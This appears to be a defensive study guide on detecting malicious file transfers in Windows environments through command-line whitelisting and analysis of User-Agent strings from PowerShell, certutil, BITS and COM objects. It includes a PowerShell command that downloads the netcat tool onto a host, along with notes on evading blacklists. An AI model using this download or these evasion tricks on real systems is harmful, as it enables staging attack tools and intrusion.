
# Detection of Malicious File Transfers

## Why Command-Line Detection Is Weak

Simple command-line detection based on **blacklisting** (e.g., blocking specific strings like `certutil`, `powershell`, `wget`) is easy to bypass. Attackers can evade this with:

* Case changes (`CertUtil`, `CERTUTIL`)
* Aliases
* Encoded commands
* Indirect execution (COM objects, DLL loading, scripting engines)

### Better Approach: Whitelisting

A **command-line whitelisting** model is far more robust:

* Baseline what *normal* command lines look like in the environment
* Alert on deviations rather than known bad strings
* Requires upfront effort but scales well and detects unknown techniques

---

## Network-Level Detection: User-Agent Analysis

### What Is a User-Agent

In HTTP-based communication, the **User-Agent** header identifies the client making the request. While commonly associated with browsers (Chrome, Firefox), **any HTTP client can define a user-agent**, including:

* PowerShell
* Certutil
* BITS
* cURL / wget
* Custom malware
* Red team tools

This makes user-agent strings a valuable detection signal.

---

## Building a User-Agent Baseline

Organizations should maintain an allowlist of **known legitimate user-agents**, including:

* Browsers used internally
* Operating system services (Windows Update)
* Antivirus update services
* Enterprise applications
* Patch management tools

Once this baseline exists, security teams can:

* Filter known-good traffic in SIEM
* Focus threat hunting on unknown or rare user-agents
* Correlate suspicious agents with unusual downloads or executions

---

## Common Malicious File Transfer User-Agents

Below are **real user-agent strings generated by common Windows file transfer techniques**.

---

### PowerShell â€“ Invoke-WebRequest / Invoke-RestMethod

**Client Command**

```powershell
Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile C:\Users\Public\nc.exe
```

**Observed Server Request**

```
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US)
WindowsPowerShell/5.1.14393.0
```

**Detection Insight**

* PowerShell user-agent downloading executables is suspicious
* Rarely used for routine business browsing

---

### WinHttpRequest COM Object

**Observed User-Agent**

```
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
```

**Detection Insight**

* Indicates scripted HTTP traffic
* Often used in fileless attacks and LOLBins abuse

---

### Msxml2.XMLHTTP

**Observed User-Agent**

```
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0;
Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
```

**Detection Insight**

* Mimics Internet Explorer
* Often abused by malware to appear legitimate
* Rare for modern enterprise applications

---

### Certutil

**Observed User-Agent**

```
User-Agent: Microsoft-CryptoAPI/10.0
```

**Detection Insight**

* Strong indicator of LOLBin abuse
* Certutil downloading executables is highly suspicious
* Frequently flagged by EDR and AMSI

---

### BITS (Background Intelligent Transfer Service)

**Observed User-Agent**

```
User-Agent: Microsoft BITS/7.8
```

**Detection Insight**

* Legitimate for Windows Update
* Suspicious when downloading from non-Microsoft domains
* Should be correlated with process execution afterward

---

## Detection Strategies Summary

### Effective Detection Signals

* Rare or unknown user-agent strings
* Built-in Windows binaries making outbound HTTP requests
* Downloads followed by immediate execution
* HTTP requests for `.exe`, `.dll`, `.ps1`, `.zip`
* BITS jobs created by non-admin users

---

### Defensive Recommendations

* Maintain a user-agent allowlist
* Alert on first-seen user-agent strings
* Correlate network traffic with endpoint telemetry
* Monitor LOLBins for network activity
* Inspect outbound HTTP traffic from system processes

---

## Key Takeaway

Malicious file transfers often look normal at the network layer but reveal themselves through **behavioral anomalies**, especially:

* Unusual user-agents
* Legitimate binaries doing unusual things
* Unexpected HTTP downloads from internal hosts

Detection is most effective when **endpoint, network, and SIEM data are correlated** rather than relying on single indicators.

---

